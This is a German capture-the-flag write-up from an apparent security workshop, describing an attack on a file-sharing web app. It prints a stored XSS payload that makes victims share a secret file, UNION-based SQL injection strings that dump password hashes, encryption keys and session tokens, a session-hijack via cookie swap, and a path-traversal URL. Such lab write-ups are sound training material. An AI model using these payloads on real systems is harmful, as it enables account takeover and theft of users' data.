# Vorgehen:

## Cross Site Scripting mit manipuliertem File

halb phishing, halb cross site scripting

siehe `niedliche_katzen.html`:
```html
<script>
  async function gimmeRecipe(file, user) {
    const response = await fetch(`/files/${file}/share`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: `userName=${user}`
    });
    return response.text();
  }

  gimmeRecipe("secret_ice_cream_recipe.txt","mee");
  gimmeRecipe("secret_ice_cream_recipe.txt","stephan");
</script>

<img src="https://icatcare.org/app/uploads/2018/07/Thinking-of-getting-a-cat.png"/>
```

das ganze erst mit 2 test accounts (stephan, mee) und einem bekannten file (z.b. einer steal_me.txt) getestet
(dann natuerlich nur eine gimmeRecipe zeile mit dem dateinamen und dem entsprechend andren user)

==> funktioniert, also variante mit dem ice-cream filenamen hochgeladen, an aarktos geteilt, und gehofft, dass aarktos da mal draufklickt
==> ergebnis: wir haben in unsrem kontext dann zugriff auf das rezept:
```
Das Geheimnis ist, dass ich die Eiscreme heimlich bei LIDL kaufe.
```


## Variante 2

suchen wir mal nach SQL Injection

=> bei User-Suche funktionierts: `";` bringt Fehler "You have an error in your SQL syntax"

=> mit UNION koennten wir rausfinden, welche tabellen/spalten etc es gibt

=> wir muessen wissen, wieviele spalten wir im zweiten select brauchen:\

- `" UNION SELECT 1 #` geht nicht
- `" UNION SELECT 1, 2 #` geht nicht
- `" UNION SELECT 1, 2, 3 #` geht nicht
- `" UNION SELECT 1, 2, 3, 4 #` geht nicht
- `" UNION SELECT 1, 2, 3, 4, 5 #` funktioniert und zeit einen user 3 (2) an => wir koennen die spalten 2 und 3 nutzen

```
" UNION SELECT 1, table_schema, table_name, 4, 5 FROM information_schema.tables #
```
sagt uns, es gibt ein schema `ctf` mit 2 tabellen:
- `sessions`
- `users`

schaun wir mal, welche spalten es da gibt:
```
" UNION SELECT 1, table_name, column_name, 4, 5 FROM information_schema.columns where table_schema="ctf" #
```
sagt uns, es gibt folgende spalten:
- Tabelle `sessions`:
  - `id`
  - `userName`
  - `token`
- Tabelle `users`:
  - `id`
  - `userName`
  - `displayName`
  - `passwordHash`
  - `encryptionKey`

```
" UNION SELECT 1, username, passwordHash, 4, 5 FROM ctf.users #
" UNION SELECT 1, username, encryptionKey, 4, 5 FROM ctf.users #
```
bringt uns folgende Infos für den aarktos User:
- passwordHash: `8166409a93efe863da3012c8f8dd2157`  --> ist offenbar md5, aber crackstation kennt den hash leider ned :-( (unsre test-account passwörter konnten so ermittelt werden)
- encryptionKey: `b2d97aa13ae22bea8697646b40c216ecff084c6c99ddfcbf4c763b7b62d131d9`  --> wenn wir ans raw file kommen, könnten wir damit decrypten

aber was steht denn nun in der andren tabelle drin?

```
" UNION SELECT 1, username, token, 4, 5 FROM ctf.sessions #
```
damit bekommen wir eine liste aller offenen sessions...

- `2035f37c-093f-4611-8c85-66a256886ded` => aarktos
- ...

v.a. finden wir auch einen Eintrag, wo der SessionKey genau dem Cookie entspricht, dass wir selber im Browser bei jedem Request mitschicken
=> wir können einfach im Browser in der Dev-Konsole das eigene Cookie durch eine fremde SessionId austauschen, und sobald wir dann auf die Files Seite
gehen, sehen wir die Files von aarktos :-)

netter nebeneffekt: hier können wir das Rezept auch noch verfälschen, nachdem wir es gestohlen haben :-)


### Raw File

wir haben ja den encryptionKey von aarktos, wie kommen wir ans File?

das styles.css wird über eine url eingebunden, die verdächtig aussieht...


```
https://team1.workshop.thenativeweb.io/cache?fileName=../../app/data/aarktos/secret_ice_cream_recipe.txt
```
liefert auch brav das geforderte file, jetz kann mans decrypten
